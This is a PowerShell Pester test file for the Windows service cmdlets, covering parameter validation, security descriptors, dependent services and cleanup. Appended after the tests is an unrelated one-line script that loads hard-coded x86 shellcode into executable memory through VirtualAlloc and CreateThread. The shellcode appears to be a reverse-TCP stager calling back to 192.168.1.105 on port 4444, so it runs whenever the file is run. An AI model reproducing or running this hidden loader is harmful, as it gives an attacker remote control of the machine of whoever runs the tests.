

Import-Module (Join-Path -Path $PSScriptRoot '..\Microsoft.PowerShell.Security\certificateCommon.psm1')

Describe "Set/New/Remove-Service cmdlet tests" -Tags "Feature", "RequireAdminOnWindows" {
    BeforeAll {
        $originalDefaultParameterValues = $PSDefaultParameterValues.Clone()
        if ( -not $IsWindows ) {
            $PSDefaultParameterValues["it:skip"] = $true
        }
        if ($IsWindows) {
            $userName = "testuserservices"
            $testPass = [Net.NetworkCredential]::new("", (New-ComplexPassword)).SecurePassword
            $creds    = [pscredential]::new(".\$userName", $testPass)
            $SecurityDescriptorSddl = 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;SU)'
            $WrongSecurityDescriptorSddl = 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BB)(A;;CCLCSWLOCRRC;;;SU)'
            net user $userName $creds.GetNetworkCredential().Password /add > $null

            $testservicename1 = "testservice1"
            $testservicename2 = "testservice2"
            $svcbinaryname    = "TestService"
            $svccmd = Get-Command $svcbinaryname
            $svccmd | Should -Not -BeNullOrEmpty
            $svcfullpath = $svccmd.Path
            $testservice1 = New-Service -BinaryPathName $svcfullpath -Name $testservicename1
            $testservice1 | Should -Not -BeNullOrEmpty
            $testservice2 = New-Service -BinaryPathName $svcfullpath -Name $testservicename2 -DependsOn $testservicename1
            $testservice2 | Should -Not -BeNullOrEmpty
        }

        Function CheckSecurityDescriptorSddl {
            Param(
                [Parameter(Mandatory)]
                $SecurityDescriptorSddl,

                [Parameter(Mandatory)]
                $ServiceName
            )
            $Counter      = 0
            $ExpectedSDDL = ConvertFrom-SddlString -Sddl $SecurityDescriptorSddl

            
            $UpdatedSDDL  = ConvertFrom-SddlString -Sddl (sc sdshow $ServiceName)[1]

            $UpdatedSDDL.Owner | Should -Be $ExpectedSDDL.Owner
            $UpdatedSDDL.Group | Should -Be $ExpectedSDDL.Group
            $UpdatedSDDL.DiscretionaryAcl.Count | Should -Be $ExpectedSDDL.DiscretionaryAcl.Count
            $UpdatedSDDL.DiscretionaryAcl | ForEach-Object -Process {
                $_ | Should -Be $ExpectedSDDL.DiscretionaryAcl[$Counter]
                $Counter++
            }
        }
    }
    AfterAll {
        $global:PSDefaultParameterValues = $originalDefaultParameterValues
        if ($IsWindows) {
            net user $userName /delete > $null

            Stop-Service $testservicename2
            Stop-Service $testservicename1
            Remove-Service $testservicename2
            Remove-Service $testservicename1
        }
    }

    It "SetServiceCommand can be used as API for '<parameter>' with '<value>'" -TestCases @(
        @{parameter = "Name"        ; value = "bar"},
        @{parameter = "DisplayName" ; value = "hello"},
        @{parameter = "Description" ; value = "hello world"},
        @{parameter = "StartupType" ; value = "Automatic"},
        @{parameter = "StartupType" ; value = "Disabled"},
        @{parameter = "StartupType" ; value = "Manual"},
        @{parameter = "Status"      ; value = "Running"},
        @{parameter = "Status"      ; value = "Stopped"},
        @{parameter = "Status"      ; value = "Paused"},
        @{parameter = "InputObject" ; script = {Get-Service | Select-Object -First 1}},
        
        @{parameter = "Include"     ; value = "foo", "bar" ; expectedNull = $true},
        
        @{parameter = "Exclude"     ; value = "foo", "bar" ; expectedNull = $true}
    ) {
        param($parameter, $value, $script, $expectedNull)

        $setServiceCommand = [Microsoft.PowerShell.Commands.SetServiceCommand]::new()
        if ($script -ne $Null) {
            $value = & $script
        }
        $setServiceCommand.$parameter = $value
        if ($expectedNull -eq $true) {
            $setServiceCommand.$parameter | Should -BeNullOrEmpty
        }
        else {
            $setServiceCommand.$parameter | Should -Be $value
        }
    }

    It "Set-Service parameter validation for invalid values: <script>" -TestCases @(
        @{
            script  = {Set-Service foo -StartupType bar -ErrorAction Stop};
            errorid = "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.SetServiceCommand"
        },
        @{
            script  = {Set-Service -Name $testservicename1 -SecurityDescriptorSddl $WrongSecurityDescriptorSddl };
            errorid = "System.ArgumentException,Microsoft.PowerShell.Commands.SetServiceCommand"
        }
    ) {
        param($script, $errorid)
        { & $script } | Should -Throw -ErrorId $errorid
    }


    It "Sets securitydescriptor of service using Set-Service " {
        Set-Service -Name $TestServiceName1 -SecurityDescriptorSddl $SecurityDescriptorSddl
        CheckSecurityDescriptorSddl -SecurityDescriptor $SecurityDescriptorSddl -ServiceName $TestServiceName1
    }

    It "Set-Service can change '<parameter>' to '<value>'" -TestCases @(
        @{parameter = "Description"; value = "hello"},
        @{parameter = "DisplayName"; value = "test spooler"},
        @{parameter = "StartupType"; value = "Disabled"},
        @{parameter = "Status"     ; value = "running"     ; expected = "OK"}
    ) {
        param($parameter, $value, $expected)
        $currentService = Get-CimInstance -ClassName Win32_Service -Filter "Name='spooler'"
        $originalStartupType = (Get-Service -Name spooler).StartType
        try {
            $setServiceCommand = [Microsoft.PowerShell.Commands.SetServiceCommand]::new()
            $setServiceCommand.Name = "Spooler"
            $setServiceCommand.$parameter = $value
            $setServiceCommand.Invoke()
            $updatedService = Get-CimInstance -ClassName Win32_Service -Filter "Name='spooler'"
            if ($expected -eq $null) {
                $expected = $value
            }
            if ($parameter -eq "StartupType") {
                $updatedService.StartMode | Should -Be $expected
            }
            else {
                $updatedService.$parameter | Should -Be $expected
            }
        }
        finally {
            if ($parameter -eq "StartupType") {
                $setServiceCommand.StartupType = $originalStartupType
            }
            else {
                $setServiceCommand.$parameter = $currentService.$parameter
            }
            $setServiceCommand.Invoke()
            $updatedService = Get-CimInstance -ClassName Win32_Service -Filter "Name='spooler'"
            $updatedService.$parameter | Should -Be $currentService.$parameter
        }
    }

    It "NewServiceCommand can be used as API for '<parameter>' with '<value>'" -TestCases @(
        @{parameter = "Name"                   ; value = "bar"},
        @{parameter = "BinaryPathName"         ; value = "hello"},
        @{parameter = "DisplayName"            ; value = "hello world"},
        @{parameter = "Description"            ; value = "this is a test"},
        @{parameter = "StartupType"            ; value = "Automatic"},
        @{parameter = "StartupType"            ; value = "Disabled"},
        @{parameter = "StartupType"            ; value = "Manual"},
        @{parameter = "SecurityDescriptorSddl" ; value = $SecurityDescriptorSddl},
        @{parameter = "Credential"             ; value = (
                [System.Management.Automation.PSCredential]::new("username",
                    
                    (ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force)))
        }
        @{parameter = "DependsOn"      ; value = "foo", "bar"}
    ) {
        param($parameter, $value)

        $newServiceCommand = [Microsoft.PowerShell.Commands.NewServiceCommand]::new()
        $newServiceCommand.$parameter = $value
        $newServiceCommand.$parameter | Should -Be $value
    }

    It "Set-Service can change credentials of a service" -Pending {
        try {
            $startUsername = "user1"
            $endUsername = "user2"
            $servicename = "testsetcredential"
            $testPass = [Net.NetworkCredential]::new("", (New-ComplexPassword)).SecurePassword
            $creds = [pscredential]::new(".\$endUsername", $testPass)
            net user $startUsername $creds.GetNetworkCredential().Password /add > $null
            net user $endUsername $creds.GetNetworkCredential().Password /add > $null
            $parameters = @{
                Name           = $servicename;
                BinaryPathName = "$PSHOME\pwsh.exe";
                StartupType    = "Manual";
                Credential     = $creds
            }
            $service = New-Service @parameters
            $service | Should -Not -BeNullOrEmpty
            $service = Get-CimInstance Win32_Service -Filter "name='$servicename'"
            $service.StartName | Should -BeExactly $creds.UserName

            Set-Service -Name $servicename -Credential $creds
            $service = Get-CimInstance Win32_Service -Filter "name='$servicename'"
            $service.StartName | Should -BeExactly $creds.UserName
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
            net user $startUsername /delete > $null
            net user $endUsername /delete > $null
        }
    }

    It "New-Service can create a new service called '<name>'" -TestCases @(
        @{name = "testautomatic"; startupType = "Automatic"; description = "foo" ; displayname = "one" ; securityDescriptorSddl = $null},
        @{name = "testmanual"   ; startupType = "Manual"   ; description = "bar" ; displayname = "two" ; securityDescriptorSddl = $SecurityDescriptorSddl},
        @{name = "testdisabled" ; startupType = "Disabled" ; description = $null ; displayname = $null ; securityDescriptorSddl = $null},
        @{name = "testsddl"     ; startupType = "Disabled" ; description = "foo" ; displayname = $null ; securityDescriptorSddl = $SecurityDescriptorSddl}
    ) {
        param($name, $startupType, $description, $displayname, $securityDescriptorSddl)
        try {
            $parameters = @{
                Name           = $name;
                BinaryPathName = "$PSHOME\pwsh.exe";
                StartupType    = $startupType;
            }
            if ($description) {
                $parameters += @{description = $description}
            }
            if ($displayname) {
                $parameters += @{displayname = $displayname}
            }
            if ($securityDescriptorSddl) {
                $parameters += @{SecurityDescriptorSddl = $securityDescriptorSddl}
            }

            $service = New-Service @parameters
            $service | Should -Not -BeNullOrEmpty
            $service.displayname | Should -Be $(if($displayname){$displayname}else{$name})
            $service.startType | Should -Be $startupType

            $service = Get-CimInstance Win32_Service -Filter "name='$name'"
            $service | Should -Not -BeNullOrEmpty
            $service.Name | Should -Be $name
            $service.Description | Should -Be $description
            $expectedStartup = $(
                switch ($startupType) {
                    "Automatic" {"Auto"}
                    "Manual" {"Manual"}
                    "Disabled" {"Disabled"}
                    default { throw "Unsupported StartupType in TestCases" }
                }
            )
            $service.StartMode | Should -Be $expectedStartup
            if ($displayname -eq $null) {
                $service.DisplayName | Should -Be $name
            }
            else {
                $service.DisplayName | Should -Be $displayname
            }
            if ($securityDescriptorSddl) {
                CheckSecurityDescriptorSddl -SecurityDescriptorSddl $SecurityDescriptorSddl -ServiceName $name
            }
        }
        finally {
            $service = Get-CimInstance Win32_Service -Filter "name='$name'"
            if ($service -ne $null) {
                $service | Remove-CimInstance
            }
        }
    }

    It "Remove-Service can remove a service" {
        try {
            $servicename = "testremoveservice"
            $parameters = @{
                Name           = $servicename;
                BinaryPathName = "$PSHOME\pwsh.exe"
            }
            $service = New-Service @parameters
            $service | Should -Not -BeNullOrEmpty
            Remove-Service -Name $servicename
            $service = Get-Service -Name $servicename -ErrorAction SilentlyContinue
            $service | Should -BeNullOrEmpty
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
        }
    }

    It "Remove-Service can accept a ServiceController as pipeline input" {
        try {
            $servicename = "testremoveservice"
            $parameters = @{
                Name           = $servicename;
                BinaryPathName = "$PSHOME\pwsh.exe"
            }
            $service = New-Service @parameters
            $service | Should -Not -BeNullOrEmpty
            Get-Service -Name $servicename | Remove-Service
            $service = Get-Service -Name $servicename -ErrorAction SilentlyContinue
            $service | Should -BeNullOrEmpty
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
        }
    }

    It "Remove-Service cannot accept a service that does not exist" {
        { Remove-Service -Name "testremoveservice" -ErrorAction 'Stop' } | Should -Throw -ErrorId "InvalidOperationException,Microsoft.PowerShell.Commands.RemoveServiceCommand"
    }

    It "Get-Service can get the '<property>' of a service" -Pending -TestCases @(
        @{property = "Description";    value = "This is a test description"}
        @{property = "BinaryPathName"; value = "$PSHOME\powershell.exe";},
        @{property = "UserName";       value = $creds.UserName; parameters = @{ Credential = $creds }},
        @{property = "StartupType";    value = "AutomaticDelayedStart";}
        ) {
            param($property, $value, $parameters)
            try {
            $servicename = "testgetservice"
            $startparameters = @{Name = $servicename; BinaryPathName = "$PSHOME\powershell.exe"}
            if($parameters -ne $null) {
                foreach($key in $parameters.Keys) {
                $startparameters.$key = $parameters.$key
                }
            } else {
                $startparameters.$property = $value
            }
            $service = New-Service @startparameters
            $service | Should -Not -BeNullOrEmpty
            $service = Get-Service -Name $servicename
            $service.$property | Should -BeExactly $value
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
        }
    }

    It "Set-Service can accept a ServiceController as pipeline input" {
        try {
            $servicename = "testsetservice"
            $newdisplayname = "newdisplayname"
            $parameters = @{
                Name           = $servicename;
                BinaryPathName = "$PSHOME\pwsh.exe"
            }
            $service = New-Service @parameters
            $service | Should -Not -BeNullOrEmpty
            Get-Service -Name $servicename | Set-Service -DisplayName $newdisplayname
            $service = Get-Service -Name $servicename
            $service.DisplayName | Should -BeExactly $newdisplayname
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
        }
    }

    It "Set-Service can accept a ServiceController as positional input" {
        try {
            $servicename = "testsetservice"
            $newdisplayname = "newdisplayname"
            $parameters = @{
                Name           = $servicename;
                BinaryPathName = "$PSHOME\pwsh.exe"
            }

            $script = { New-Service @parameters | Set-Service -DisplayName $newdisplayname }
            { & $script } | Should -Not -Throw
            $service = Get-Service -Name $servicename
            $service.DisplayName | Should -BeExactly $newdisplayname
        }
        finally {
            Get-CimInstance Win32_Service -Filter "name='$servicename'" | Remove-CimInstance -ErrorAction SilentlyContinue
        }
    }

    It "Using bad parameters will fail for '<name>' where '<parameter>' = '<value>'" -TestCases @(
        @{cmdlet="New-Service"; name = 'credtest'    ; parameter = "Credential" ; value = (
            [System.Management.Automation.PSCredential]::new("username",
            
            (ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force)));
            errorid = "CouldNotNewService,Microsoft.PowerShell.Commands.NewServiceCommand"},
        @{cmdlet="New-Service"; name = 'badstarttype'; parameter = "StartupType"; value = "System";
            errorid = "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.NewServiceCommand"},
        @{cmdlet="New-Service"; name = 'winmgmt'     ; parameter = "DisplayName"; value = "foo";
            errorid = "CouldNotNewService,Microsoft.PowerShell.Commands.NewServiceCommand"},
        @{cmdlet="Set-Service"; name = 'winmgmt'     ; parameter = "StartupType"; value = "Boot";
            errorid = "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.SetServiceCommand"}
    ) {
        param($cmdlet, $name, $parameter, $value, $errorid)
        $parameters = @{$parameter = $value; Name = $name; ErrorAction = "Stop"}
        if ($cmdlet -eq "New-Service") {
            $parameters += @{Binary = "$PSHOME\pwsh.exe"};
        }
        { & $cmdlet @parameters } | Should -Throw -ErrorId $errorid
    }

    Context "Set-Service test cases on the services with dependent relationship" {
        BeforeEach {
            { Set-Service -Status Running $testservicename2 } | Should -Not -Throw
            (Get-Service $testservicename1).Status | Should -BeExactly "Running"
            (Get-Service $testservicename2).Status | Should -BeExactly "Running"
        }

        It "Set-Service can stop a service with dependency" {
            $script = { Set-Service -Status Stopped $testservicename2 -ErrorAction Stop }
            { & $script } | Should -Not -Throw
            (Get-Service $testservicename2).Status | Should -BeExactly "Stopped"
        }

        It "Set-Service cannot stop a service with running dependent service" {
            $script = { Set-Service -Status Stopped $testservicename1 -ErrorAction Stop }
            { & $script } | Should -Throw
            (Get-Service $testservicename1).Status | Should -BeExactly "Running"
            (Get-Service $testservicename2).Status | Should -BeExactly "Running"
        }

        It "Set-Service can stop a service with running dependent service by parameter -Force" {
            $script = { Set-Service -Status Stopped -Force $testservicename1 -ErrorAction Stop }
            { & $script } | Should -Not -Throw
            (Get-Service $testservicename1).Status | Should -BeExactly "Stopped"
            (Get-Service $testservicename2).Status | Should -BeExactly "Stopped"
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x69,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

